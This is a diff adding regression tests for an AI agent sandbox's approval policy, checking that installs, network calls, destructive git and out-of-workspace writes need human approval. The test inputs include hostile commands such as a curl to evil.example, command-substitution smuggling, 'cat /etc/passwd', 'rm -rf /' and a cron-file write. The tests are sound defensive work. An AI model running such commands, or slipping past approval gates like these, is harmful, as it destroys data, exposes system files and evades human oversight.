@@ -487,6 +487,37 @@ class TestSandboxTools:
         )
 
     @pytest.mark.asyncio
+    async def test_auto_workspace_writes_dispatch_blocks_installs(self):
+        # Regression (Phase 1, 1.2): mutating sandbox_exec commands
+        # reach requires_approval with is_write=True from dispatch;
+        # installs / network / destructive git must still be gated.
+        from backend.mcp_server.tool_dispatch import execute_tools_internal
+
+        mgr, created = _manager_with_fake()
+        settings = {
+            "sandbox_enabled": True,
+            "sandbox_manager": mgr,
+            "sandbox_autonomy_mode": "auto_workspace_writes",
+        }
+        for command in (
+            "pip install requests",
+            "curl https://evil.example/x",
+            "git reset --hard",
+            "rm ../outside.txt",
+        ):
+            _c, merged = await execute_tools_internal(
+                [{"name": "sandbox_exec", "args": {"command": command}}],
+                "tenant-1",
+                settings,
+            )
+            payloads = [getattr(m, "payload", {}) for m in merged]
+            assert any(
+                "approval_required" in p for p in payloads
+                if isinstance(p, dict)
+            ), command
+        assert created == []
+
+    @pytest.mark.asyncio
     async def test_get_tools_absent_when_disabled(self):
         from backend.mcp_server.tool_dispatch import get_tools
 
@@ -568,3 +599,72 @@ class TestSandboxTools:
             p.get("approval_required", {}).get("tool_name") == "sandbox_write_file"
             for p in payloads if isinstance(p, dict)
         )
+
+
+class TestSandboxPolicyHardening:
+    """Phase 1 (1.2): plan-mode and auto_workspace_writes bypasses."""
+
+    def test_command_substitution_blocked_in_plan_mode(self):
+        assert plan_mode_block(
+            "plan", tool_name="sandbox_exec",
+            command='git status "$(touch pwned)"',
+        ) is not None
+        assert plan_mode_block(
+            "plan", tool_name="sandbox_exec", command="git status `id`"
+        ) is not None
+        assert plan_mode_block(
+            "plan", tool_name="sandbox_exec", command="ls <(cat /etc/passwd)"
+        ) is not None
+        assert plan_mode_block(
+            "plan", tool_name="sandbox_exec", command="ls\nrm -rf /"
+        ) is not None
+
+    def test_git_branch_argument_aware(self):
+        assert classify_command("git branch -D feature") == "mutating"
+        assert classify_command("git branch new-branch") == "mutating"
+        assert classify_command("git branch -m old new") == "mutating"
+        assert classify_command("git branch --list") == "read_only"
+        assert classify_command("git branch --show-current") == "read_only"
+        assert classify_command("git branch") == "read_only"
+        assert plan_mode_block(
+            "plan", tool_name="sandbox_exec", command="git branch -D feature"
+        ) is not None
+        assert plan_mode_block(
+            "plan", tool_name="sandbox_exec", command="git branch --list"
+        ) is None
+
+    def test_auto_workspace_writes_path_confinement(self):
+        mode = "auto_workspace_writes"
+        assert requires_approval(mode, "rm ../outside.txt") is True
+        assert requires_approval(mode, "rm -rf /etc") is True
+        assert requires_approval(mode, "cp a.py /etc/cron.d/x") is True
+        assert requires_approval(mode, "echo hi > /tmp/x") is True
+        assert requires_approval(mode, "echo hi > ../x") is True
+        assert requires_approval(mode, "echo hi > out.txt") is False
+        assert requires_approval(mode, "rm src/old.py") is False
+        # A known workspace root confines absolute paths against it.
+        assert requires_approval(
+            mode, "rm /tmp/ws/old.py", workspace_root="/tmp/ws"
+        ) is False
+        assert requires_approval(
+            mode, "rm /tmp/other/old.py", workspace_root="/tmp/ws"
+        ) is True
+
+    def test_auto_workspace_writes_interpreters_gated(self):
+        mode = "auto_workspace_writes"
+        assert requires_approval(mode, "python -m pip install foo") is True
+        assert requires_approval(mode, 'python -c "import os"') is True
+        assert requires_approval(mode, "python script.py") is True
+        assert requires_approval(mode, "node server.js") is True
+        assert requires_approval(mode, "make build") is True
+        assert requires_approval(mode, "python -m pytest -q") is False
+        assert requires_approval(mode, "python -m ruff check .") is False
+
+    def test_auto_workspace_writes_dispatch_style_is_write(self):
+        # Regression: dispatch passes is_write=True for mutating
+        # sandbox_exec commands; that must not short-circuit the
+        # command analysis in auto_workspace_writes mode.
+        mode = "auto_workspace_writes"
+        assert requires_approval(mode, "pip install requests", is_write=True) is True
+        assert requires_approval(mode, "curl https://evil.example", is_write=True) is True
+        assert requires_approval(mode, "git reset --hard", is_write=True) is True
